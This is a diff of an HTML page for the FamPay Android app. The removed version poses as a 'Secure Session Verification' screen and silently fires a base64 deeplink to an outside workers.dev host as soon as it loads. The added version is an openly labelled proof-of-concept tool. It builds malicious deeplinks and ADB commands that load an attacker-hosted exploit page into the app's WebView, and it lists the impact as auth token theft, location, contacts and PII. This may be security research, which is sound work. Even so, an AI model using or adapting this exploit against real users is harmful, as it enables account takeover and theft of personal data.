@@ -1,120 +1,324 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FamPay Secure Verification</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FamPay – PoC Trigger | Internal Security</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: #0a0a0f;
+    color: #e0e0e0;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    padding: 20px 16px;
+    gap: 16px;
+  }
+  .logo {
+    font-size: 24px;
+    font-weight: 900;
+    color: #00d084;
+    letter-spacing: -0.5px;
+    margin-top: 10px;
+  }
+  .badge {
+    font-size: 10px;
+    background: #1a0010;
+    border: 1px solid #ff1744;
+    color: #ff6060;
+    padding: 3px 10px;
+    border-radius: 20px;
+    letter-spacing: 1px;
+  }
+  .card {
+    background: #13131a;
+    border: 1px solid #2a2a3a;
+    border-radius: 12px;
+    padding: 20px;
+    width: 100%;
+    max-width: 480px;
+  }
+  .card h3 {
+    font-size: 13px;
+    color: #448aff;
+    margin-bottom: 12px;
+    letter-spacing: 0.5px;
+  }
+  label { font-size: 11px; color: #888; display: block; margin-bottom: 4px; }
+  input[type="text"] {
+    width: 100%;
+    background: #0d0d14;
+    border: 1px solid #2a2a3a;
+    color: #e0e0e0;
+    padding: 10px 12px;
+    border-radius: 6px;
+    font-size: 12px;
+    font-family: monospace;
+    margin-bottom: 10px;
+  }
+  input[type="text"]:focus { outline: none; border-color: #448aff; }
+  .hint { font-size: 10px; color: #555; margin-top: -6px; margin-bottom: 10px; }
 
-    <style>
-        body {
-            margin: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
-            background: #0d0d0d;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+  select {
+    width: 100%;
+    background: #0d0d14;
+    border: 1px solid #2a2a3a;
+    color: #e0e0e0;
+    padding: 10px 12px;
+    border-radius: 6px;
+    font-size: 12px;
+    margin-bottom: 10px;
+  }
 
-        .card {
-            background: #1c1c1c;
-            padding: 25px;
-            border-radius: 16px;
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
-        }
+  .btn-primary {
+    width: 100%;
+    padding: 13px;
+    background: #00d084;
+    color: #000;
+    border: none;
+    border-radius: 8px;
+    font-weight: 700;
+    font-size: 14px;
+    cursor: pointer;
+    letter-spacing: 0.3px;
+  }
+  .btn-secondary {
+    width: 100%;
+    padding: 11px;
+    background: transparent;
+    color: #448aff;
+    border: 1px solid #448aff;
+    border-radius: 8px;
+    font-weight: 600;
+    font-size: 12px;
+    cursor: pointer;
+    margin-top: 8px;
+  }
 
-        .logo {
-            font-size: 26px;
-            font-weight: bold;
-            color: #00d084;
-        }
+  .deeplink-box {
+    background: #0d0d14;
+    border: 1px solid #2a2a3a;
+    border-radius: 6px;
+    padding: 10px;
+    font-size: 10px;
+    font-family: monospace;
+    word-break: break-all;
+    color: #888;
+    min-height: 40px;
+    margin-top: 10px;
+    cursor: pointer;
+    transition: border-color 0.2s;
+  }
+  .deeplink-box:hover { border-color: #448aff; }
+  .deeplink-box .label { font-size: 9px; color: #555; margin-bottom: 4px; }
+  .deeplink-box .value { color: #00e676; }
 
-        .title {
-            margin-top: 20px;
-            font-size: 20px;
-        }
+  .steps { display: flex; flex-direction: column; gap: 8px; }
+  .step {
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    font-size: 12px;
+  }
+  .step-num {
+    min-width: 22px;
+    height: 22px;
+    background: #1a1a2a;
+    border: 1px solid #2a2a3a;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 10px;
+    font-weight: bold;
+    color: #448aff;
+  }
+  .step-text { color: #aaa; line-height: 1.5; padding-top: 2px; }
+  .step-text code {
+    background: #0d0d14;
+    padding: 1px 5px;
+    border-radius: 3px;
+    color: #00e676;
+    font-size: 11px;
+  }
 
-        .subtitle {
-            font-size: 14px;
-            color: #aaa;
-            margin-top: 10px;
-        }
+  #status {
+    font-size: 11px;
+    text-align: center;
+    color: #666;
+    min-height: 16px;
+  }
+  #status.ok { color: #00d084; }
+  #status.err { color: #ff1744; }
 
-        .loader {
-            margin: 25px auto;
-            border: 4px solid #333;
-            border-top: 4px solid #00d084;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-        }
+  .divider {
+    height: 1px;
+    background: #2a2a3a;
+    width: 100%;
+    max-width: 480px;
+  }
 
-        @keyframes spin {
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .status {
-            font-size: 14px;
-            color: #00d084;
-        }
-
-        .btn {
-            margin-top: 20px;
-            padding: 12px;
-            width: 100%;
-            border: none;
-            border-radius: 8px;
-            background: #00d084;
-            color: black;
-            font-weight: bold;
-        }
-    </style>
-
-    <script>
-        const DEEPLINK = "fp://fampay.in/home_init/?init_deeplink=aHR0cHM6Ly95YXRoLXNlYy5mYW1hcHAtdWF0LndvcmtlcnMuZGV2Lz9mcF9hdXRoX3JlcT10cnVlJmZwX3R5cGU9ZnBTdXJ2ZXkmZnBfbmV3X3dpbmRvdz10cnVlJnNvdXJjZT1hcHAmcGxhdGZvcm09YW5kcm9pZCZpc1dlYnZpZXc9dHJ1ZQo=";
-
-        function openApp() {
-            document.getElementById("status").innerText = "Opening secure session...";
-            window.location.href = DEEPLINK;
-
-            // fallback if app not opened
-            setTimeout(() => {
-                document.getElementById("status").innerText = "If not redirected, tap below.";
-                document.getElementById("btn").style.display = "block";
-            }, 2000);
-        }
-
-        window.onload = function () {
-            setTimeout(openApp, 1200);
-        };
-    </script>
-
+  .info-box {
+    background: #0d1a10;
+    border: 1px solid #1a3a20;
+    border-radius: 6px;
+    padding: 12px;
+    font-size: 11px;
+    color: #aaa;
+    line-height: 1.6;
+  }
+  .info-box strong { color: #00e676; }
+</style>
 </head>
-
 <body>
 
-    <div class="card">
-        <div class="logo">FamPay</div>
+<div class="logo">FamPay</div>
+<span class="badge">INTERNAL SECURITY PoC — DO NOT DISTRIBUTE</span>
 
-        <div class="title">🔐 Secure Session Verification</div>
-        <div class="subtitle">Please wait while we verify your account...</div>
+<!-- Step 1: Configure -->
+<div class="card">
+  <h3>STEP 1 — Configure Your Test Server</h3>
 
-        <div class="loader"></div>
+  <label>Server hosting exploit.html</label>
+  <input type="text" id="serverUrl"
+         placeholder="http://192.168.1.x:8080  or  https://your-ngrok.io"
+         oninput="buildLink()">
+  <div class="hint">Run: python3 -m http.server 8080 in the poc/vuln2/ folder</div>
 
-        <div id="status" class="status">Initializing...</div>
+  <label>Attack mode</label>
+  <select id="attackMode" onchange="buildLink()">
+    <option value="fpSurvey">fpSurvey — Injects NativeActionsAndroid + NativeAuthAndroid (max access)</option>
+    <option value="fpAuthReq">fp_auth_req=true — Injects NativeAuthAndroid only</option>
+    <option value="basic">Basic — NativeActionsAndroid + ContactActionsAndroid only</option>
+  </select>
 
-        <button id="btn" class="btn" style="display:none;" onclick="openApp()">
-            Continue
-        </button>
+  <div class="deeplink-box" onclick="copyDeeplink()" id="deeplinkBox">
+    <div class="label">Generated deeplink (tap to copy):</div>
+    <div class="value" id="deeplinkValue">← Enter server URL above to generate</div>
+  </div>
+
+  <div id="status">Waiting for configuration...</div>
+</div>
+
+<!-- Step 2: Launch -->
+<div class="card">
+  <h3>STEP 2 — Launch Attack</h3>
+
+  <div class="steps">
+    <div class="step">
+      <div class="step-num">1</div>
+      <div class="step-text">Connect test device via USB with <code>adb</code> or open this page in Chrome on the device</div>
     </div>
+    <div class="step">
+      <div class="step-num">2</div>
+      <div class="step-text">Make sure FamPay app is installed and the test account is logged in</div>
+    </div>
+    <div class="step">
+      <div class="step-num">3</div>
+      <div class="step-text">Click <strong>FIRE DEEPLINK</strong> below, or run the ADB command</div>
+    </div>
+    <div class="step">
+      <div class="step-num">4</div>
+      <div class="step-text">FamPay opens → navigates to exploit.html → JS interfaces are injected → data displayed on screen</div>
+    </div>
+  </div>
 
+  <br>
+  <button class="btn-primary" onclick="fireDeeplink()">&#9889; FIRE DEEPLINK (Browser)</button>
+  <button class="btn-secondary" onclick="showAdb()">Show ADB Command</button>
+
+  <div id="adbBox" style="display:none;margin-top:10px;">
+    <div class="deeplink-box">
+      <div class="label">ADB command (paste in terminal):</div>
+      <div class="value" id="adbCmd" style="word-break:break-all;"></div>
+    </div>
+    <button class="btn-secondary" onclick="copyAdb()" style="margin-top:6px;">Copy ADB Command</button>
+  </div>
+</div>
+
+<!-- Info -->
+<div class="divider"></div>
+<div class="card">
+  <h3>HOW THIS WORKS</h3>
+  <div class="info-box">
+    <strong>Root cause:</strong> DeepLinkActivity (exported=true) accepts <code>fp://fampay.in/home_init/?init_deeplink=&lt;base64&gt;</code>, decodes the URL, and passes it to WebviewActivity without domain validation.<br><br>
+    <strong>WebviewActivity</strong> then injects 4 powerful JavaScript interfaces (<code>NativeActionsAndroid</code>, <code>ContactActionsAndroid</code>, <code>AutoLoadActionsAndroid</code>, <code>NativeAuthAndroid</code>) into the attacker-controlled page.<br><br>
+    <strong>Impact:</strong> Auth token theft · GPS location · Full contact list · User PII · Native deeplink execution
+  </div>
+</div>
+
+<script>
+let currentDeeplink = "";
+
+function buildLink() {
+  const server = document.getElementById("serverUrl").value.trim().replace(/\/$/, "");
+  const mode   = document.getElementById("attackMode").value;
+
+  if (!server) {
+    document.getElementById("deeplinkValue").innerText = "← Enter server URL above";
+    document.getElementById("status").innerText = "Waiting...";
+    document.getElementById("status").className = "";
+    return;
+  }
+
+  let exploitUrl = server + "/exploit.html";
+  if (mode === "fpSurvey") {
+    exploitUrl += "?fp_type=fpSurvey&fp_auth_req=true&fp_new_window=true&source=app&platform=android";
+  } else if (mode === "fpAuthReq") {
+    exploitUrl += "?fp_auth_req=true&fp_new_window=true&source=app&platform=android";
+  } else {
+    exploitUrl += "?source=app&platform=android";
+  }
+
+  const b64 = btoa(exploitUrl);
+  currentDeeplink = "fp://fampay.in/home_init/?init_deeplink=" + b64;
+
+  document.getElementById("deeplinkValue").innerText = currentDeeplink;
+  document.getElementById("status").innerText = "✓ Deeplink ready — " + exploitUrl;
+  document.getElementById("status").className = "ok";
+
+  // Update ADB command
+  document.getElementById("adbCmd").innerText =
+    `adb shell am start -a android.intent.action.VIEW -d "${currentDeeplink}" com.fampay.in`;
+}
+
+function fireDeeplink() {
+  if (!currentDeeplink) {
+    document.getElementById("status").innerText = "Configure server URL first!";
+    document.getElementById("status").className = "err";
+    return;
+  }
+  document.getElementById("status").innerText = "Firing deeplink... FamPay should open now.";
+  document.getElementById("status").className = "ok";
+  window.location.href = currentDeeplink;
+}
+
+function showAdb() {
+  const box = document.getElementById("adbBox");
+  box.style.display = box.style.display === "none" ? "block" : "none";
+}
+
+function copyDeeplink() {
+  if (!currentDeeplink) return;
+  navigator.clipboard.writeText(currentDeeplink).then(() => {
+    document.getElementById("status").innerText = "✓ Deeplink copied to clipboard!";
+    document.getElementById("status").className = "ok";
+  }).catch(() => {
+    document.getElementById("status").innerText = "Select and copy manually.";
+  });
+}
+
+function copyAdb() {
+  const cmd = document.getElementById("adbCmd").innerText;
+  navigator.clipboard.writeText(cmd).then(() => {
+    document.getElementById("status").innerText = "✓ ADB command copied!";
+    document.getElementById("status").className = "ok";
+  });
+}
+</script>
 </body>
-
 </html>
